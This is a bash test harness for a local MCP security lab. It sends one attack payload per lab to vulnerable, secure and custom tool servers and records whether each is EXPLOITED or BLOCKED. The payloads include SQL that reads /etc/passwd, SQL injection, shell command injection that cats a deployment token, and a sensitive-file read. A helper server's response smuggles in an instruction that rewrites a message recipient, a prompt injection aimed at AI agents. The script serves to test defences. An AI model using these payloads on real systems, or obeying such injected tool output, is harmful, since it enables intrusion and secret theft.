#!/usr/bin/env bash
# 用官方 MCP Inspector（CLI 模式）手動重現每題的核心攻擊：一次 tools/call，不經過 AI。
# 對 vulnerable / secure / mine 各送同一個 payload，原始 JSON 存到 evidence/inspector/，
# 回應含「攻擊成功的指標字串」就記 EXPLOITED，否則 BLOCKED。
# 前置：./labctl.sh up all
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
OUT="$HERE/evidence/inspector"
mkdir -p "$OUT"

printf 'FROM node:22-slim\nRUN npm i -g @modelcontextprotocol/inspector@2.9.0\n' \
  | docker build --network host -q -t mcplab-inspector - >/dev/null

declare -A PORT=(
  [01v]=8101 [01s]=9001 [01m]=7001  [02v]=8002 [02s]=9002 [02m]=7002
  [03v]=8004 [03s]=9004 [03m]=7004  [04v]=8020 [04s]=9020 [04m]=7020
  [05v]=8005 [05s]=9005 [05m]=7005  [06v]=8006 [06s]=9006 [06m]=7006
  [07v]=9007 [07s]=9907 [07m]=7007  [08v]=8008 [08s]=9008 [08m]=7008
  [09v]=8009 [09s]=9009 [09m]=7009
)

inspect() {  # inspect <port> <tool> [key=value...]
  local port="$1" tool="$2"; shift 2
  local args=()
  [ $# -gt 0 ] && args=(--tool-arg "$@")  # 無參數工具不能帶空的 --tool-arg
  docker run --rm --network host mcplab-inspector mcp-inspector --cli \
    "http://127.0.0.1:$port/mcp/stream" --transport http \
    --method tools/call --tool-name "$tool" "${args[@]}" 2>&1
}

# case <lab> <指標字串> <tool> [key=value...]
case_() {
  local lab="$1" indicator="$2"; shift 2
  for v in v s m; do
    local name; name="$(case $v in v) echo vulnerable;; s) echo secure;; m) echo mine;; esac)"
    local file="$OUT/lab$lab-$name.json"
    [ "$lab" = 07 ] && inspect "${PORT[$lab$v]}" "$@" >"$file.step1"  # 07 先寫入，再讀回
    if [ "$lab" = 07 ]; then
      inspect "${PORT[$lab$v]}" summarize_all_tickets >"$file"
    else
      inspect "${PORT[$lab$v]}" "$@" >"$file"
    fi
    if grep -qF -- "$indicator" "$file"; then r=EXPLOITED; else r=BLOCKED; fi
    printf '%-4s %-11s %s\n' "$lab" "$name" "$r"
  done
}

echo "=== helper（Lab 03 攻擊來源）：同一個 server 連叫兩次 ==="
inspect 8003 get_fact_of_the_day >"$OUT/lab03-helper-call1.json"
inspect 8003 get_fact_of_the_day >"$OUT/lab03-helper-call2.json"
grep -qF "+13241234123" "$OUT/lab03-helper-call2.json" && echo "helper 第二次回應夾帶改寫收件人的指令：YES" || echo "helper 第二次回應夾帶指令：NO"

echo "=== 核心攻擊 ==="
printf '%-4s %-11s %s\n' lab target result
case_ 01 'FLAG{confused_deputy_leak}' fetch_project project_id=CRM-2001 api_key=alpha-api-key
case_ 02 'FLAG{cve_2025_53110_escape_route}' read_file_contents file_path=/app/files/safe_files_sensitive/secret.txt
case_ 03 'dispatched to +13241234123' send_message recipient=+13241234123 'body=Hi there!'
case_ 04 'root:x:0:0' run_query "sql=SELECT pg_read_file('/etc/passwd') AS f"
case_ 05 'FLAG{newsroom_prompt_exfiltration}' read_config_value section=bing_copilot_tokens
case_ 06 'added to firewall blocklist' block_ip ip_address=192.168.1.100 'reason=Critical DDoS source'
case_ 07 'FLAG{sql_prompt_injection_leak}' create_ticket author=eve "content=x'), ('leak', (SELECT payload FROM incident_intel WHERE id = 1))-- "
case_ 08 'FLAG{git_command_injection_cve}' init_bare_repository 'repo_name=x; cat /app/secrets/deployment_token.txt'
case_ 09 'FLAG{webhook_secret_xyz789}' get_repo_webhooks repo=private-repo
